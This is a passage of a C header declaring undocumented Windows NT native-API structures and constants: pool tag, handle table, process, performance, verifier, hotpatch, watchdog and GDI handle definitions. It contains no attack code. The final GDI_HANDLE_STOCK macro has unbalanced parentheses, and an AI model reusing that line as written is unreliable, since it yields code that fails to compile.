	ULONG PagedFrees;
	SIZE_T PagedUsed;
	ULONG NonPagedAllocs;
	ULONG NonPagedFrees;
	SIZE_T NonPagedUsed;
} SYSTEM_POOLTAG, *PSYSTEM_POOLTAG;

typedef struct _SYSTEM_BIGPOOL_ENTRY {
	union {
		PVOID VirtualAddress;
		ULONG_PTR NonPaged : 1;     // Set to 1 if entry is nonpaged.
	};
	SIZE_T SizeInBytes;
	union {
		UCHAR Tag[4];
		ULONG TagUlong;
	};
} SYSTEM_BIGPOOL_ENTRY, *PSYSTEM_BIGPOOL_ENTRY;

typedef struct _SYSTEM_POOLTAG_INFORMATION
{
	ULONG Count;
	SYSTEM_POOLTAG TagInfo[ 1 ];
} SYSTEM_POOLTAG_INFORMATION, *PSYSTEM_POOLTAG_INFORMATION;

typedef struct _SYSTEM_SESSION_POOLTAG_INFORMATION {
	SIZE_T NextEntryOffset;
	ULONG SessionId;
	ULONG Count;
	SYSTEM_POOLTAG TagInfo[ 1 ];
} SYSTEM_SESSION_POOLTAG_INFORMATION, *PSYSTEM_SESSION_POOLTAG_INFORMATION;

typedef struct _SYSTEM_BIGPOOL_INFORMATION {
	ULONG Count;
	SYSTEM_BIGPOOL_ENTRY AllocatedInfo[ 1 ];
} SYSTEM_BIGPOOL_INFORMATION, *PSYSTEM_BIGPOOL_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[ 1 ];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
{
	PVOID Object;
	ULONG UniqueProcessId;
	ULONG HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG NumberOfHandles;
	ULONG Reserved;
	struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[ 1 ];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

typedef struct _SYSTEM_SPECIAL_POOL_INFORMATION
{
	ULONG PoolTag;
	ULONG Flags;
} SYSTEM_SPECIAL_POOL_INFORMATION, *PSYSTEM_SPECIAL_POOL_INFORMATION;

typedef struct _SYSTEM_OBJECTTYPE_INFORMATION
{
	ULONG NextEntryOffset;
	ULONG NumberOfObjects;
	ULONG NumberOfHandles;
	ULONG TypeIndex;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccessMask;
	ULONG PoolType;
	UCHAR SecurityRequired;
	UCHAR WaitableObject;
	UNICODE_STRING TypeName;
} SYSTEM_OBJECTTYPE_INFORMATION, *PSYSTEM_OBJECTTYPE_INFORMATION;

typedef struct _SYSTEM_HIBERFILE_INFORMATION
{
	ULONG NumberOfMcbPairs;
	LARGE_INTEGER Mcb[ 1 ];
} SYSTEM_HIBERFILE_INFORMATION, *PSYSTEM_HIBERFILE_INFORMATION;

typedef struct _SYSTEM_KERNEL_DEBUGGER_INFORMATION {
	BOOLEAN KernelDebuggerEnabled;
	BOOLEAN KernelDebuggerNotPresent;
} SYSTEM_KERNEL_DEBUGGER_INFORMATION, *PSYSTEM_KERNEL_DEBUGGER_INFORMATION;

typedef struct _SYSTEM_REGISTRY_QUOTA_INFORMATION {
	ULONG  RegistryQuotaAllowed;
	ULONG  RegistryQuotaUsed;
	SIZE_T PagedPoolSize;
} SYSTEM_REGISTRY_QUOTA_INFORMATION, *PSYSTEM_REGISTRY_QUOTA_INFORMATION;

typedef struct _SYSTEM_CONTEXT_SWITCH_INFORMATION {
	ULONG ContextSwitches;
	ULONG FindAny;
	ULONG FindLast;
	ULONG FindIdeal;
	ULONG IdleAny;
	ULONG IdleCurrent;
	ULONG IdleLast;
	ULONG IdleIdeal;
	ULONG PreemptAny;
	ULONG PreemptCurrent;
	ULONG PreemptLast;
	ULONG SwitchToIdle;
} SYSTEM_CONTEXT_SWITCH_INFORMATION, *PSYSTEM_CONTEXT_SWITCH_INFORMATION;

typedef struct _SYSTEM_SESSION_MAPPED_VIEW_INFORMATION {
	SIZE_T NextEntryOffset;
	ULONG SessionId;
	ULONG ViewFailures;
	SIZE_T NumberOfBytesAvailable;
	SIZE_T NumberOfBytesAvailableContiguous;
} SYSTEM_SESSION_MAPPED_VIEW_INFORMATION, *PSYSTEM_SESSION_MAPPED_VIEW_INFORMATION;

typedef struct _SYSTEM_INTERRUPT_INFORMATION {
	ULONG ContextSwitches;
	ULONG DpcCount;
	ULONG DpcRate;
	ULONG TimeIncrement;
	ULONG DpcBypassCount;
	ULONG ApcBypassCount;
} SYSTEM_INTERRUPT_INFORMATION, *PSYSTEM_INTERRUPT_INFORMATION;

typedef struct _SYSTEM_DPC_BEHAVIOR_INFORMATION {
	ULONG Spare;
	ULONG DpcQueueDepth;
	ULONG MinimumDpcRate;
	ULONG AdjustDpcThreshold;
	ULONG IdealDpcRate;
} SYSTEM_DPC_BEHAVIOR_INFORMATION, *PSYSTEM_DPC_BEHAVIOR_INFORMATION;

typedef struct _SYSTEM_LOOKASIDE_INFORMATION {
	USHORT CurrentDepth;
	USHORT MaximumDepth;
	ULONG TotalAllocates;
	ULONG AllocateMisses;
	ULONG TotalFrees;
	ULONG FreeMisses;
	ULONG Type;
	ULONG Tag;
	ULONG Size;
} SYSTEM_LOOKASIDE_INFORMATION, *PSYSTEM_LOOKASIDE_INFORMATION;

typedef struct _SYSTEM_LEGACY_DRIVER_INFORMATION {
	ULONG VetoType;
	UNICODE_STRING VetoList;
} SYSTEM_LEGACY_DRIVER_INFORMATION, *PSYSTEM_LEGACY_DRIVER_INFORMATION;

typedef struct _SYSTEM_VDM_INSTEMUL_INFO
{
	ULONG SegmentNotPresent;
	ULONG VdmOpcode0F;
	ULONG OpcodeESPrefix;
	ULONG OpcodeCSPrefix;
	ULONG OpcodeSSPrefix;
	ULONG OpcodeDSPrefix;
	ULONG OpcodeFSPrefix;
	ULONG OpcodeGSPrefix;
	ULONG OpcodeOPER32Prefix;
	ULONG OpcodeADDR32Prefix;
	ULONG OpcodeINSB;
	ULONG OpcodeINSW;
	ULONG OpcodeOUTSB;
	ULONG OpcodeOUTSW;
	ULONG OpcodePUSHF;
	ULONG OpcodePOPF;
	ULONG OpcodeINTnn;
	ULONG OpcodeINTO;
	ULONG OpcodeIRET;
	ULONG OpcodeINBimm;
	ULONG OpcodeINWimm;
	ULONG OpcodeOUTBimm;
	ULONG OpcodeOUTWimm;
	ULONG OpcodeINB;
	ULONG OpcodeINW;
	ULONG OpcodeOUTB;
	ULONG OpcodeOUTW;
	ULONG OpcodeLOCKPrefix;
	ULONG OpcodeREPNEPrefix;
	ULONG OpcodeREPPrefix;
	ULONG OpcodeHLT;
	ULONG OpcodeCLI;
	ULONG OpcodeSTI;
	ULONG BopCount;
} SYSTEM_VDM_INSTEMUL_INFO, *PSYSTEM_VDM_INSTEMUL_INFO;

typedef struct _SYSTEM_TIMEOFDAY_INFORMATION
{
	LARGE_INTEGER BootTime;
	LARGE_INTEGER CurrentTime;
	LARGE_INTEGER TimeZoneBias;
	ULONG TimeZoneId;
	ULONG Reserved;
	ULONGLONG BootTimeBias;
	ULONGLONG SleepTimeBias;
} SYSTEM_TIMEOFDAY_INFORMATION, *PSYSTEM_TIMEOFDAY_INFORMATION;

#if defined(_M_X64)
typedef ULONG SYSINF_PAGE_COUNT;
#else
typedef SIZE_T SYSINF_PAGE_COUNT;
#endif

typedef struct _SYSTEM_BASIC_INFORMATION {
	ULONG Reserved;
	ULONG TimerResolution;
	ULONG PageSize;
	SYSINF_PAGE_COUNT NumberOfPhysicalPages;
	SYSINF_PAGE_COUNT LowestPhysicalPageNumber;
	SYSINF_PAGE_COUNT HighestPhysicalPageNumber;
	ULONG AllocationGranularity;
	ULONG_PTR MinimumUserModeAddress;
	ULONG_PTR MaximumUserModeAddress;
	ULONG_PTR ActiveProcessorsAffinityMask;
	CCHAR NumberOfProcessors;
} SYSTEM_BASIC_INFORMATION, *PSYSTEM_BASIC_INFORMATION;

typedef struct _SYSTEM_PROCESSOR_INFORMATION {
	USHORT ProcessorArchitecture;
	USHORT ProcessorLevel;
	USHORT ProcessorRevision;
	USHORT Reserved;
	ULONG ProcessorFeatureBits;
} SYSTEM_PROCESSOR_INFORMATION, *PSYSTEM_PROCESSOR_INFORMATION;

typedef struct _SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION {
	LARGE_INTEGER IdleTime;
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER DpcTime;          // Checked Build
	LARGE_INTEGER InterruptTime;    // Checked Build
	ULONG InterruptCount;
} SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION, *PSYSTEM_PROCESSOR_PERFORMANCE_INFORMATION;

typedef struct _SYSTEM_PROCESSOR_IDLE_INFORMATION {
	ULONGLONG IdleTime;
	ULONGLONG C1Time;
	ULONGLONG C2Time;
	ULONGLONG C3Time;
	ULONG     C1Transitions;
	ULONG     C2Transitions;
	ULONG     C3Transitions;
	ULONG     Padding;
} SYSTEM_PROCESSOR_IDLE_INFORMATION, *PSYSTEM_PROCESSOR_IDLE_INFORMATION;

typedef struct _SYSTEM_NUMA_INFORMATION {
	ULONG HighestNodeNumber;
	ULONG Reserved;
	union {
		ULONG64 ActiveProcessorsAffinityMask[ 16 ];
		ULONG64 AvailableMemory[ 16 ];
	};
} SYSTEM_NUMA_INFORMATION, *PSYSTEM_NUMA_INFORMATION;

#if !defined(_WINNT_)

typedef enum _LOGICAL_PROCESSOR_RELATIONSHIP
{
	RelationProcessorCore,
	RelationNumaNode,
	RelationCache,
	RelationProcessorPackage
} LOGICAL_PROCESSOR_RELATIONSHIP;

typedef enum _PROCESSOR_CACHE_TYPE
{
	CacheUnified,
	CacheInstruction,
	CacheData,
	CacheTrace
} PROCESSOR_CACHE_TYPE;

#define CACHE_FULLY_ASSOCIATIVE 0xFF

typedef struct _CACHE_DESCRIPTOR
{
	BYTE   Level;
	BYTE   Associativity;
	WORD   LineSize;
	DWORD  Size;
	PROCESSOR_CACHE_TYPE Type;
} CACHE_DESCRIPTOR, *PCACHE_DESCRIPTOR;

typedef struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION {
	ULONG_PTR   ProcessorMask;
	LOGICAL_PROCESSOR_RELATIONSHIP Relationship;
	union {
		struct {
			BYTE  Flags;
		} ProcessorCore;
		struct {
			DWORD NodeNumber;
		} NumaNode;
		CACHE_DESCRIPTOR Cache;
		ULONGLONG  Reserved[2];
	};
} SYSTEM_LOGICAL_PROCESSOR_INFORMATION, *PSYSTEM_LOGICAL_PROCESSOR_INFORMATION;

#define PROCESSOR_INTEL_386     386
#define PROCESSOR_INTEL_486     486
#define PROCESSOR_INTEL_PENTIUM 586
#define PROCESSOR_INTEL_IA64    2200
#define PROCESSOR_AMD_X8664     8664
#define PROCESSOR_MIPS_R4000    4000    // incl R4101 & R3910 for Windows CE
#define PROCESSOR_ALPHA_21064   21064
#define PROCESSOR_PPC_601       601
#define PROCESSOR_PPC_603       603
#define PROCESSOR_PPC_604       604
#define PROCESSOR_PPC_620       620
#define PROCESSOR_HITACHI_SH3   10003   // Windows CE
#define PROCESSOR_HITACHI_SH3E  10004   // Windows CE
#define PROCESSOR_HITACHI_SH4   10005   // Windows CE
#define PROCESSOR_MOTOROLA_821  821     // Windows CE
#define PROCESSOR_SHx_SH3       103     // Windows CE
#define PROCESSOR_SHx_SH4       104     // Windows CE
#define PROCESSOR_STRONGARM     2577    // Windows CE - 0xA11
#define PROCESSOR_ARM720        1824    // Windows CE - 0x720
#define PROCESSOR_ARM820        2080    // Windows CE - 0x820
#define PROCESSOR_ARM920        2336    // Windows CE - 0x920
#define PROCESSOR_ARM_7TDMI     70001   // Windows CE
#define PROCESSOR_OPTIL         0x494f  // MSIL

#define PROCESSOR_ARCHITECTURE_INTEL            0
#define PROCESSOR_ARCHITECTURE_MIPS             1
#define PROCESSOR_ARCHITECTURE_ALPHA            2
#define PROCESSOR_ARCHITECTURE_PPC              3
#define PROCESSOR_ARCHITECTURE_SHX              4
#define PROCESSOR_ARCHITECTURE_ARM              5
#define PROCESSOR_ARCHITECTURE_IA64             6
#define PROCESSOR_ARCHITECTURE_ALPHA64          7
#define PROCESSOR_ARCHITECTURE_MSIL             8
#define PROCESSOR_ARCHITECTURE_AMD64            9
#define PROCESSOR_ARCHITECTURE_IA32_ON_WIN64    10

#define PROCESSOR_ARCHITECTURE_UNKNOWN 0xFFFF

#define PF_FLOATING_POINT_PRECISION_ERRATA  0   
#define PF_FLOATING_POINT_EMULATED          1   
#define PF_COMPARE_EXCHANGE_DOUBLE          2   
#define PF_MMX_INSTRUCTIONS_AVAILABLE       3   
#define PF_PPC_MOVEMEM_64BIT_OK             4   
#define PF_ALPHA_BYTE_INSTRUCTIONS          5   
#define PF_XMMI_INSTRUCTIONS_AVAILABLE      6   
#define PF_3DNOW_INSTRUCTIONS_AVAILABLE     7   
#define PF_RDTSC_INSTRUCTION_AVAILABLE      8   
#define PF_PAE_ENABLED                      9   
#define PF_XMMI64_INSTRUCTIONS_AVAILABLE   10   
#define PF_SSE_DAZ_MODE_AVAILABLE          11   
#define PF_NX_ENABLED                      12   
#define PF_SSE3_INSTRUCTIONS_AVAILABLE     13   
#define PF_COMPARE_EXCHANGE128             14   
#define PF_COMPARE64_EXCHANGE128           15   
#define PF_CHANNELS_ENABLED                16   

typedef struct _MEMORY_BASIC_INFORMATION
{
	PVOID BaseAddress;
	PVOID AllocationBase;
	DWORD AllocationProtect;
	SIZE_T RegionSize;
	DWORD State;
	DWORD Protect;
	DWORD Type;
} MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;

#endif /*_WINNT_*/

typedef struct _SYSTEM_PROCESSOR_POWER_INFORMATION {
	UCHAR			CurrentFrequency;
	UCHAR			ThermalLimitFrequency;
	UCHAR			ConstantThrottleFrequency;
	UCHAR			DegradedThrottleFrequency;
	UCHAR			LastBusyFrequency;
	UCHAR			LastC3Frequency;
	UCHAR			LastAdjustedBusyFrequency;
	UCHAR			ProcessorMinThrottle;
	UCHAR			ProcessorMaxThrottle;
	ULONG			NumberOfFrequencies;
	ULONG			PromotionCount;
	ULONG			DemotionCount;
	ULONG			ErrorCount;
	ULONG			RetryCount;
	ULONG64   CurrentFrequencyTime;
	ULONG64   CurrentProcessorTime;
	ULONG64   CurrentProcessorIdleTime;
	ULONG64   LastProcessorTime;
	ULONG64   LastProcessorIdleTime;
} SYSTEM_PROCESSOR_POWER_INFORMATION, *PSYSTEM_PROCESSOR_POWER_INFORMATION;

typedef struct _SYSTEM_QUERY_TIME_ADJUST_INFORMATION {
	ULONG TimeAdjustment;
	ULONG TimeIncrement;
	BOOLEAN Enable;
} SYSTEM_QUERY_TIME_ADJUST_INFORMATION, *PSYSTEM_QUERY_TIME_ADJUST_INFORMATION;

typedef struct _SYSTEM_SET_TIME_ADJUST_INFORMATION {
	ULONG TimeAdjustment;
	BOOLEAN Enable;
} SYSTEM_SET_TIME_ADJUST_INFORMATION, *PSYSTEM_SET_TIME_ADJUST_INFORMATION;

typedef struct _SYSTEM_PERFORMANCE_INFORMATION {
	LARGE_INTEGER IdleProcessTime;
	LARGE_INTEGER IoReadTransferCount;
	LARGE_INTEGER IoWriteTransferCount;
	LARGE_INTEGER IoOtherTransferCount;
	ULONG IoReadOperationCount;
	ULONG IoWriteOperationCount;
	ULONG IoOtherOperationCount;
	ULONG AvailablePages;
	SYSINF_PAGE_COUNT CommittedPages;
	SYSINF_PAGE_COUNT CommitLimit;
	SYSINF_PAGE_COUNT PeakCommitment;
	ULONG PageFaultCount;
	ULONG CopyOnWriteCount;
	ULONG TransitionCount;
	ULONG CacheTransitionCount;
	ULONG DemandZeroCount;
	ULONG PageReadCount;
	ULONG PageReadIoCount;
	ULONG CacheReadCount;
	ULONG CacheIoCount;
	ULONG DirtyPagesWriteCount;
	ULONG DirtyWriteIoCount;
	ULONG MappedPagesWriteCount;
	ULONG MappedWriteIoCount;
	ULONG PagedPoolPages;
	ULONG NonPagedPoolPages;
	ULONG PagedPoolAllocs;
	ULONG PagedPoolFrees;
	ULONG NonPagedPoolAllocs;
	ULONG NonPagedPoolFrees;
	ULONG FreeSystemPtes;
	ULONG ResidentSystemCodePage;
	ULONG TotalSystemDriverPages;
	ULONG TotalSystemCodePages;
	ULONG NonPagedPoolLookasideHits;
	ULONG PagedPoolLookasideHits;
	ULONG AvailablePagedPoolPages;
	ULONG ResidentSystemCachePage;
	ULONG ResidentPagedPoolPage;
	ULONG ResidentSystemDriverPage;
	ULONG CcFastReadNoWait;
	ULONG CcFastReadWait;
	ULONG CcFastReadResourceMiss;
	ULONG CcFastReadNotPossible;
	ULONG CcFastMdlReadNoWait;
	ULONG CcFastMdlReadWait;
	ULONG CcFastMdlReadResourceMiss;
	ULONG CcFastMdlReadNotPossible;
	ULONG CcMapDataNoWait;
	ULONG CcMapDataWait;
	ULONG CcMapDataNoWaitMiss;
	ULONG CcMapDataWaitMiss;
	ULONG CcPinMappedDataCount;
	ULONG CcPinReadNoWait;
	ULONG CcPinReadWait;
	ULONG CcPinReadNoWaitMiss;
	ULONG CcPinReadWaitMiss;
	ULONG CcCopyReadNoWait;
	ULONG CcCopyReadWait;
	ULONG CcCopyReadNoWaitMiss;
	ULONG CcCopyReadWaitMiss;
	ULONG CcMdlReadNoWait;
	ULONG CcMdlReadWait;
	ULONG CcMdlReadNoWaitMiss;
	ULONG CcMdlReadWaitMiss;
	ULONG CcReadAheadIos;
	ULONG CcLazyWriteIos;
	ULONG CcLazyWritePages;
	ULONG CcDataFlushes;
	ULONG CcDataPages;
	ULONG ContextSwitches;
	ULONG FirstLevelTbFills;
	ULONG SecondLevelTbFills;
	ULONG SystemCalls;
} SYSTEM_PERFORMANCE_INFORMATION, *PSYSTEM_PERFORMANCE_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER SpareLi1;
	LARGE_INTEGER SpareLi2;
	LARGE_INTEGER SpareLi3;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	HANDLE InheritedFromUniqueProcessId;
	ULONG HandleCount;
	ULONG SessionId;
	ULONG_PTR PageDirectoryBase;
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	LARGE_INTEGER ReadTransferCount;
	LARGE_INTEGER WriteTransferCount;
	LARGE_INTEGER OtherTransferCount;
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef struct _SYSTEM_SESSION_PROCESS_INFORMATION {
	ULONG SessionId;
	ULONG SizeOfBuf;
	PVOID Buffer;
} SYSTEM_SESSION_PROCESS_INFORMATION, *PSYSTEM_SESSION_PROCESS_INFORMATION;

typedef struct _SYSTEM_MEMORY_INFO {
	PUCHAR StringOffset;
	USHORT ValidCount;
	USHORT TransitionCount;
	USHORT ModifiedCount;
	USHORT PageTableCount;
} SYSTEM_MEMORY_INFO, *PSYSTEM_MEMORY_INFO;

typedef struct _SYSTEM_MEMORY_INFORMATION {
	ULONG InfoSize;
	ULONG_PTR StringStart;
	SYSTEM_MEMORY_INFO Memory[ 1 ];
} SYSTEM_MEMORY_INFORMATION, *PSYSTEM_MEMORY_INFORMATION;

typedef struct _SYSTEM_CALL_COUNT_INFORMATION {
	ULONG Length;
	ULONG NumberOfTables;
} SYSTEM_CALL_COUNT_INFORMATION, *PSYSTEM_CALL_COUNT_INFORMATION;

typedef struct _SYSTEM_DEVICE_INFORMATION {
	ULONG NumberOfDisks;
	ULONG NumberOfFloppies;
	ULONG NumberOfCdRoms;
	ULONG NumberOfTapes;
	ULONG NumberOfSerialPorts;
	ULONG NumberOfParallelPorts;
} SYSTEM_DEVICE_INFORMATION, *PSYSTEM_DEVICE_INFORMATION;

typedef struct _SYSTEM_FLAGS_INFORMATION {
	ULONG Flags;
} SYSTEM_FLAGS_INFORMATION, *PSYSTEM_FLAGS_INFORMATION;

typedef struct _SYSTEM_CALL_TIME_INFORMATION {
	ULONG Length;
	ULONG TotalCalls;
	LARGE_INTEGER TimeOfCalls[1];
} SYSTEM_CALL_TIME_INFORMATION, *PSYSTEM_CALL_TIME_INFORMATION;

typedef struct _SYSTEM_OBJECT_INFORMATION {
	ULONG NextEntryOffset;
	PVOID Object;
	HANDLE CreatorUniqueProcess;
	USHORT CreatorBackTraceIndex;
	USHORT Flags;
	LONG PointerCount;
	LONG HandleCount;
	ULONG PagedPoolCharge;
	ULONG NonPagedPoolCharge;
	HANDLE ExclusiveProcessId;
	PVOID SecurityDescriptor;
	OBJECT_NAME_INFORMATION NameInfo;
} SYSTEM_OBJECT_INFORMATION, *PSYSTEM_OBJECT_INFORMATION;

typedef struct _SYSTEM_PAGEFILE_INFORMATION {
	ULONG NextEntryOffset;
	ULONG TotalSize;
	ULONG TotalInUse;
	ULONG PeakUsage;
	UNICODE_STRING PageFileName;
} SYSTEM_PAGEFILE_INFORMATION, *PSYSTEM_PAGEFILE_INFORMATION;

typedef struct _SYSTEM_VERIFIER_INFORMATION {
	ULONG NextEntryOffset;
	ULONG Level;
	UNICODE_STRING DriverName;

	ULONG RaiseIrqls;
	ULONG AcquireSpinLocks;
	ULONG SynchronizeExecutions;
	ULONG AllocationsAttempted;

	ULONG AllocationsSucceeded;
	ULONG AllocationsSucceededSpecialPool;
	ULONG AllocationsWithNoTag;
	ULONG TrimRequests;

	ULONG Trims;
	ULONG AllocationsFailed;
	ULONG AllocationsFailedDeliberately;
	ULONG Loads;

	ULONG Unloads;
	ULONG UnTrackedPool;
	ULONG CurrentPagedPoolAllocations;
	ULONG CurrentNonPagedPoolAllocations;

	ULONG PeakPagedPoolAllocations;
	ULONG PeakNonPagedPoolAllocations;

	SIZE_T PagedPoolUsageInBytes;
	SIZE_T NonPagedPoolUsageInBytes;
	SIZE_T PeakPagedPoolUsageInBytes;
	SIZE_T PeakNonPagedPoolUsageInBytes;

} SYSTEM_VERIFIER_INFORMATION, *PSYSTEM_VERIFIER_INFORMATION;

typedef struct _SYSTEM_VERIFIER_INFORMATION_EX
{
	ULONG VerifyMode;
	ULONG OptionChanges;
	UNICODE_STRING PreviousBucketName;
	ULONG Reserved[ 4 ];
} SYSTEM_VERIFIER_INFORMATION_EX, *PSYSTEM_VERIFIER_INFORMATION_EX;

#define MM_WORKING_SET_MAX_HARD_ENABLE      0x1
#define MM_WORKING_SET_MAX_HARD_DISABLE     0x2
#define MM_WORKING_SET_MIN_HARD_ENABLE      0x4
#define MM_WORKING_SET_MIN_HARD_DISABLE     0x8

typedef struct _SYSTEM_FILECACHE_INFORMATION {
	SIZE_T CurrentSize;
	SIZE_T PeakSize;
	ULONG PageFaultCount;
	SIZE_T MinimumWorkingSet;
	SIZE_T MaximumWorkingSet;
	SIZE_T CurrentSizeIncludingTransitionInPages;
	SIZE_T PeakSizeIncludingTransitionInPages;
	ULONG TransitionRePurposeCount;
	ULONG Flags;
} SYSTEM_FILECACHE_INFORMATION, *PSYSTEM_FILECACHE_INFORMATION;

#define FLG_HOTPATCH_KERNEL             0x80000000
#define FLG_HOTPATCH_RELOAD_NTDLL       0x40000000
#define FLG_HOTPATCH_NAME_INFO          0x20000000
#define FLG_HOTPATCH_RENAME_INFO        0x10000000
#define FLG_HOTPATCH_MAP_ATOMIC_SWAP    0x08000000
#define FLG_HOTPATCH_WOW64              0x04000000

#define FLG_HOTPATCH_ACTIVE             0x00000001
#define FLG_HOTPATCH_STATUS_FLAGS       FLG_HOTPATCH_ACTIVE

#define FLG_HOTPATCH_VERIFICATION_ERROR 0x00800000

typedef struct _HOTPATCH_HOOK_DESCRIPTOR
{
	ULONG_PTR TargetAddress;
	PVOID MappedAddress;
	ULONG CodeOffset;
	ULONG CodeSize;
	ULONG OrigCodeOffset;
	ULONG ValidationOffset;
	ULONG ValidationSize;
} HOTPATCH_HOOK_DESCRIPTOR, *PHOTPATCH_HOOK_DESCRIPTOR;

typedef struct _SYSTEM_HOTPATCH_CODE_INFORMATION {

	ULONG Flags;
	ULONG InfoSize;

	union
	{
		struct
		{
			ULONG DescriptorsCount;
			HOTPATCH_HOOK_DESCRIPTOR CodeDescriptors[1]; // variable size structure
		} CodeInfo;
		
		struct
		{
			USHORT NameOffset;
			USHORT NameLength;
		} KernelInfo;
		
		struct
		{
			USHORT NameOffset;
			USHORT NameLength;
			USHORT TargetNameOffset;
			USHORT TargetNameLength;
		} UserModeInfo;
		
		struct
		{
			HANDLE FileHandle1;
			PIO_STATUS_BLOCK IoStatusBlock1;
			PFILE_RENAME_INFORMATION RenameInformation1;
			ULONG RenameInformationLength1;
			HANDLE FileHandle2;
			PIO_STATUS_BLOCK IoStatusBlock2;
			PFILE_RENAME_INFORMATION RenameInformation2;
			ULONG RenameInformationLength2;
		} RenameInfo;

		struct
		{
			HANDLE ParentDirectory;
			HANDLE ObjectHandle1;
			HANDLE ObjectHandle2;
		} AtomicSwap;
	};

} SYSTEM_HOTPATCH_CODE_INFORMATION, *PSYSTEM_HOTPATCH_CODE_INFORMATION;

typedef struct _KERNEL_USER_TIMES {
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER ExitTime;
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
} KERNEL_USER_TIMES;
typedef KERNEL_USER_TIMES *PKERNEL_USER_TIMES;

typedef enum _WATCHDOG_HANDLER_ACTION
{
	WdActionSetTimeoutValue,
	WdActionQueryTimeoutValue,
	WdActionResetTimer,
	WdActionStopTimer,
	WdActionStartTimer,
	WdActionSetTriggerAction,
	WdActionQueryTriggerAction,
	WdActionQueryState,
	WdActionSleep,
	WdActionWake
} WATCHDOG_HANDLER_ACTION;

typedef enum _WATCHDOG_INFORMATION_CLASS {
	WdInfoTimeoutValue,
	WdInfoResetTimer,
	WdInfoStopTimer,
	WdInfoStartTimer,
	WdInfoTriggerAction,
	WdInfoState
} WATCHDOG_INFORMATION_CLASS;

typedef
	NTSTATUS
	(*PWD_HANDLER)(
	IN WATCHDOG_HANDLER_ACTION Action,
	IN PVOID Context,
	IN OUT PULONG DataValue,
	IN BOOLEAN NoLocks
	);

typedef struct _SYSTEM_WATCHDOG_HANDLER_INFORMATION {
	PWD_HANDLER WdHandler;
	PVOID       Context;
} SYSTEM_WATCHDOG_HANDLER_INFORMATION, *PSYSTEM_WATCHDOG_HANDLER_INFORMATION;

#define WDSTATE_FIRED               0x00000001
#define WDSTATE_HARDWARE_ENABLED    0x00000002
#define WDSTATE_STARTED             0x00000004
#define WDSTATE_HARDWARE_PRESENT    0x00000008

typedef struct _SYSTEM_WATCHDOG_TIMER_INFORMATION {
	WATCHDOG_INFORMATION_CLASS  WdInfoClass;
	ULONG                       DataValue;
} SYSTEM_WATCHDOG_TIMER_INFORMATION, *PSYSTEM_WATCHDOG_TIMER_INFORMATION;

#define GDI_MAX_HANDLE_COUNT 0x4000

#define GDI_HANDLE_INDEX_SHIFT 0
#define GDI_HANDLE_INDEX_BITS 16
#define GDI_HANDLE_INDEX_MASK 0xffff

#define GDI_HANDLE_TYPE_SHIFT 16
#define GDI_HANDLE_TYPE_BITS 5
#define GDI_HANDLE_TYPE_MASK 0x1f

#define GDI_HANDLE_ALTTYPE_SHIFT 21
#define GDI_HANDLE_ALTTYPE_BITS 2
#define GDI_HANDLE_ALTTYPE_MASK 0x3

#define GDI_HANDLE_STOCK_SHIFT 23
#define GDI_HANDLE_STOCK_BITS 1
#define GDI_HANDLE_STOCK_MASK 0x1

#define GDI_HANDLE_UNIQUE_SHIFT 24
#define GDI_HANDLE_UNIQUE_BITS 8
#define GDI_HANDLE_UNIQUE_MASK 0xff

#define GDI_HANDLE_INDEX(Handle) ((ULONG)(Handle) & GDI_HANDLE_INDEX_MASK)
#define GDI_HANDLE_TYPE(Handle) (((ULONG)(Handle) >> GDI_HANDLE_TYPE_SHIFT) & GDI_HANDLE_TYPE_MASK)
#define GDI_HANDLE_ALTTYPE(Handle) (((ULONG)(Handle) >> GDI_HANDLE_ALTTYPE_SHIFT) & GDI_HANDLE_ALTTYPE_MASK)
#define GDI_HANDLE_STOCK(Handle) (((ULONG)(Handle) >> GDI_HANDLE_STOCK_SHIFT)) & GDI_HANDLE_STOCK_MASK)

